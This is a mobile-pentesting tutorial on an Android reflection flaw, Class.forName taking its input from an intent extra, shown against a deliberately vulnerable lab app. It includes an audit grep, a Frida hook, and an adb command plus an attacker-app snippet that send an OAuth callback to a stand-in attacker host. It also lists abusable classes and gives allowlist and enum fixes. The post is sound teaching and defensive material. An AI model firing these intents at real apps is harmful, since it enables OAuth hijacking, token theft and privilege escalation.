---
title: Android - Class.forName from an Intent Extra
author: nirajkharel
date: 2026-06-14 14:30:00 +0800
categories: [Mobile Pentesting, Android]
tags: [Mobile Pentesting, Android, Reflection]
render_with_liquid: false
---


`Class.forName(intent.getStringExtra("class_name"))` is one step short of the dynamic-code-loading bug. The attacker cannot supply new code, but they can pick which existing class on the app's classpath gets instantiated and which method on it runs. In practice that is enough to reach internal initialization logic, OAuth handlers, admin utilities, or database migration runners that the developer never intended to be accessible from outside.

<aside class="lab">
  <p><strong>Vulnerable demo</strong> · <a href="https://github.com/nirajkharel/VulnLabApp">VulnLabApp</a></p>
  <ul>
    <li><code>android/app/src/main/java/com/vulnlab/app/activities/ReflectionActivity.java</code></li>
  </ul>
</aside>

<br>**Where do you find it?**

```bash
grep -rn 'Class\.forName\|getMethod\|newInstance' decompile/
```

For each match, check whether the class-name argument comes from an intent extra. VulnLabApp's `ReflectionActivity` is exported and exposes all three levers - class name, method name, and a string argument - directly from intent extras.

<br>**What does this code do?**

```java
// VulnLabApp/ReflectionActivity.java
String className  = intent.getStringExtra("class_name");
String methodName = intent.getStringExtra("method_name");
String methodArg  = intent.getStringExtra("method_arg");

if (className != null && methodName != null) {
    tvOutput.setText(invokeReflection(className, methodName, methodArg));
}

private String invokeReflection(String className, String methodName, String methodArg) {
    try {
        Log.d(TAG, "[reflection] Class.forName: " + className
            + " method: " + methodName + " arg: " + methodArg);

        // VULN: Class.forName with attacker-controlled string
        Class<?> cls = Class.forName(className);
        Object instance = cls.newInstance();

        Method method;
        Object result;
        if (methodArg != null) {
            method = cls.getMethod(methodName, String.class);
            result = method.invoke(instance, methodArg);
        } else {
            method = cls.getMethod(methodName);
            result = method.invoke(instance);
        }
        return "Result: " + result;
    } catch (ClassNotFoundException e) { return "Class not found: " + className; }
    catch (NoSuchMethodException e)     { return "Method not found: " + methodName; }
    catch (Exception e)                 { return "Error: " + e.getMessage(); }
}
```

Any class on the app's classpath with a public no-arg constructor is reachable. Any public method on it that takes zero or one String argument is callable. The app's own internal classes - debug utilities, OAuth handlers, migration runners - are all within reach.

Confirm with Frida:

```javascript
Java.perform(function () {
  const Cls    = Java.use('java.lang.Class');
  const Thread = Java.use('java.lang.Thread');
  const forName3 = Cls.forName.overload('java.lang.String', 'boolean', 'java.lang.ClassLoader');

  Cls.forName.overload('java.lang.String').implementation = function (name) {
    // Pass the thread's context class loader explicitly.
    // Calling this.forName(name) from the Frida bridge uses the boot class loader,
    // which misses app classes (EmojiCompatInitializer, androidx.*) and crashes startup.
    const cl = Thread.currentThread().getContextClassLoader();
    const result = forName3.call(this, name, true, cl);
    if (name.startsWith('com.vulnlab.app')) {
      console.log('[Class.forName] ' + name);
    }
    return result;
  };
});
```

```bash
adb shell am start -n com.vulnlab.app/.activities.ReflectionActivity \
  --es class_name "com.vulnlab.app.activities.OAuthCallbackActivity" \
  --es method_name "process" \
  --es method_arg "https://attacker.example/oauth-callback"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/reflection-class-1.png">

Logcat (tag `VulnReflection`) shows the exact class, method, and arg received from the intent.

<br>**What classes are worth targeting?**

Walk the decompile for classes with a public no-arg constructor and any of:

- A method that does sensitive setup or reads credentials.
- A static initializer that runs side effects on first load.
- A constructor with state-changing behavior.

Examples seen in real apps:

**DebugDataDumper** - instantiation prints session tokens to logcat. Combined with a log-reader, that is credential theft.

**OAuthCallbackHandler** - runs an OAuth flow on construction with attacker-controlled callback URL. The user's auth code goes to the attacker.

**MigrationRunner** - runs database migrations on instantiation. Destructive if migrations delete or downgrade data.

**AdminPanelActivity** - has a `grantAdmin()` method that bypasses normal role checks because the developer assumed only the admin flow calls it.

<br>**What does the attacker app do?**

```java
Intent i = new Intent();
i.setClassName("com.vulnlab.app", "com.vulnlab.app.activities.ReflectionActivity");
i.putExtra("class_name",  "com.vulnlab.app.activities.OAuthCallbackActivity");
i.putExtra("method_name", "process");
i.putExtra("method_arg",  "https://attacker.example/oauth-callback");
i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

`ReflectionActivity` is exported, so any installed app can fire it and supply all three extras. The target reflects on whatever class the attacker names and calls whatever method they specify.

<br>**What is the fix?**

An allowlist mapping from known-safe names to fixed class references:

```java
private static final Map<String, Class<?>> ALLOWED = Map.of(
    "maps",   MapsPlugin.class,
    "search", SearchPlugin.class
);

String key = getIntent().getStringExtra("plugin");
Class<?> cls = ALLOWED.get(key);
if (cls == null) throw new SecurityException("unknown plugin");
cls.newInstance();
```

Or an enum that makes the set of valid classes explicit at compile time:

```java
enum PluginType {
    MAPS(MapsPlugin.class), SEARCH(SearchPlugin.class);
    final Class<?> cls;
    PluginType(Class<?> c) { this.cls = c; }
}
PluginType t = PluginType.valueOf(getIntent().getStringExtra("plugin"));
t.cls.newInstance();
```

Both patterns make it impossible to reach any class outside the defined set.

<br>**Closing**

`Class.forName` from an intent extra is a class-picker that hands the caller arbitrary constructor and method invocation inside the target's process. The audit is one grep. The exploitation work is finding which class in the target has the most impactful behavior on instantiation. Any class with privileged setup logic or state-changing methods is the exploit chain.

Happy Hacking !!
